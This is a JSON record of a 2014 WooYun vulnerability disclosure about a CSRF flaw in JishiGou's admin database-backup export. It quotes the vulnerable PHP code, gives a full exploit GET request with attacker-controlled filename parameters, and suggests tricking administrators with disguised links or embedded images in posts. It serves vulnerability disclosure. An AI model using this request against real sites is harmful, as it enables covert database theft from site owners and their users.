{"id": 48615, "wybug_id": "wooyun-2014-077398", "wybug_title": "记事狗定制裁剪逻辑错误导致csrf脱裤", "wybug_corp": "杭州神话", "wybug_author": "menmen519", "wybug_date": "2014-09-26 18:26", "wybug_open_date": "2014-12-22 18:28", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述： 记事狗 定制裁剪逻辑错误导致csrf脱裤  这个系统交互程度还是相对比较大，因为是微博相关，所以在这里提出来 详细说明：  直接看代码:db.mod.php:(576-620)：\n$f = str_replace(array('/', '\\\\', '.'), '', $filename);\t\t$f = dir_safe($f);\t\t$backupdir = 'db/' . $f;\t\t$backupfilename = './data/backup/'.$backupdir.'/'.$f;\t\tif (!is_dir(($d = dirname($backupfilename)))) {\t\t\tjio()->MakeDir($d);\t\t}\t\t\t\tif($usezip) {\t\t\trequire_once ROOT_PATH . 'include/func/zip.func.php';\t\t}\t\t\t\tif($method == 'multivol') {\t\t\t$sqldump = '';\t\t\t$tableid = intval(get_param('tableid'));\t\t\t$startfrom = intval(get_param('startfrom'));\t\t\t$complete = TRUE;\t\t\tfor(; $complete && $tableid < count($tables) && strlen($sqldump) + 500 < $sizelimit * 1000; $tableid++) {\t\t\t\t$sqldump .= $this->_sql_dump_table($tables[$tableid], $startfrom, strlen($sqldump));\t\t\t\tif($complete) {\t\t\t\t\t$startfrom = 0;\t\t\t\t}\t\t\t}\t\t\t$dumpfile = $backupfilename.\"-%s\".'.sql';\t\t\t!$complete && $tableid--;\t\t\tif(trim($sqldump)) {\t\t\t\t$sqldump = \"$idstring\".\t\t\t\t\"# <?php exit(); ?>\\n\".\t\t\t\t\"# JishiGou Multi-Volume Data Dump Vol.$volume\\n\".\t\t\t\t\"# Version: JishiGou \".SYS_VERSION.\"\\n\".\t\t\t\t\"# Time: $time\\n\".\t\t\t\t\"# Type: $type\\n\".\t\t\t\t\"# Table Prefix: $tablepre\\n\".\t\t\t\t\"#\\n\".\t\t\t\t\"# JishiGou Home: http:\\/\\/www.jishigou.net\\n\".\t\t\t\t\"# Please visit our website for newest infomation about JishiGou\\n\".\t\t\t\t\"# --------------------------------------------------------\\n\\n\\n\".\t\t\t\t\"$setnames\".\t\t\t\t$sqldump;\t\t\t\t$dumpfilename = sprintf($dumpfile, $volume);\n看见了没有 最终备份的数据库名字来自两个地方，我们提炼一下：\n$f = str_replace(array('/', '\\\\', '.'), '', $filename);$f = dir_safe($f);$backupdir = 'db/' . $f;$backupfilename = './data/backup/'.$backupdir.'/'.$f;$dumpfile = $backupfilename.\"-%s\".'.sql';$dumpfilename = sprintf($dumpfile, $volume);\n看到了没有 需要的这些参数完全是从url可以控制的，我们发送url：http://192.168.10.70/archiver-jishigou.4.7.4.20140922.utf8/admin.php?mod=db&code=doexport&type=all_tables&saveto=server&filename=201409261043_xxxx&method=multivol&sizelimit=2048&volume=2&tableid=1&startfrom=0&extendins=1&sqlcharset=&sqlcompat=&exportsubmit=yes&usehex=1&usezip=0filename 和 volume 控制了我们备份的文件名称我们访问一下\n\n\n\n这个是一个get请求 而且没有csrf 你可以在自己网站分享一个链接给管理员 伪装的好一些  也可以在微博里面嵌入图片等等 方法就不多说了   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-22 18:28 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-26 20:03 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  mark一下    \n     2014-09-27 10:41 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  CSRF 给你玩出shi来了    \n     2014-09-27 12:56 |    \t\tRainShine \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        )\t\t \n  MARK    \n     2014-09-27 23:18 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  占座    \n     2014-09-28 11:06 |    \t\tcnssr4bb1t \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 优美。)\t\t \n  mark    \n     2014-10-02 08:30 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  中国好忽略    \n     2014-12-23 08:03 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  menmen519==csrf    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}